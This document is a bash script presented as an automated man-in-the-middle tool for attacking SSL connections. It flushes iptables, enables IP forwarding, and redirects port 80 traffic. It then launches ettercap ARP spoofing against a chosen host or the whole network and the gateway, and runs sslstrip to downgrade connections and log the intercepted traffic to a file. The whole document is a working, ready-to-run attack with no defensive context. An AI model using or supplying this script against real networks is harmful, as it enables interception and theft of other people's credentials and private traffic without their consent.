#!/bin/bash

#Clearing Screen

clear

echo ""
echo "Automated Man in the Middle Script for Attacking SSL Connections"
echo ""
echo "By: Tyler Price"
echo ""

#Flushing IPTables

iptables --flush

echo "[*] IP Tables Flushed"

#Enable Port Forwarding

echo "1" > /proc/sys/net/ipv4/ip_forward


echo "[*] IP Forwarding Enabled"
echo ""

#Configure IP Tables

echo "Enter Interface to Use For The Attack, Followed by [ENTER]"

read interface
echo ""

echo "Enter Redirect Port for SSL (Default 10000), followed by [Enter]"

read dport

if [[ $dport = "" ]]; then
	
	dport="10000"
fi


iptables -t nat -A PREROUTING -p tcp -i $interface --destination-port 80 -j REDIRECT --to-port $dport


echo "[*] IP Tables Enabled with interface of: $interface and Destination Port of: $dport"
echo ""

#ARPspoofing (Ettercap)

echo "Enter the IP Address to Target, Followed by [ENTER]"


echo "To Target Entire Network Press [ENTER] Now"


read targetip


if [[ $targetip = '' ]]; then

	echo "Target IP is set to: //"
	echo ""
else

	echo "Target IP is set to: $targetip"
	echo ""
fi


echo "[*] Enter the Gateway Address to Target, Followed by [ENTER]"


read gateway

echo ""
echo "[*] Target Gateway is set to: $gateway"
echo ""

echo "[*] Starting ARP Spoofing"
echo ""

echo "ettercap -T -q -i $interface -M arp /$targetip/ /$gateway/"
echo ""

gnome-terminal -e "ettercap -T -q -i $interface -M arp /$targetip/ /$gateway/"


#Start SSL Strip in New Process

echo "[*] Enter Path for SSL Log"

read filename
echo ""

echo "[*] Press [ENTER] to Start SSL STRIP"

read start
echo ""

gnome-terminal -e "sslstrip -f -l $dport -w $filename"

echo "sslstrip -f -l $dport -w $filename"
echo ""

echo "[*] Writing Log to File: $filename"
echo ""

echo "[*] Proccess Complete...Exiting"
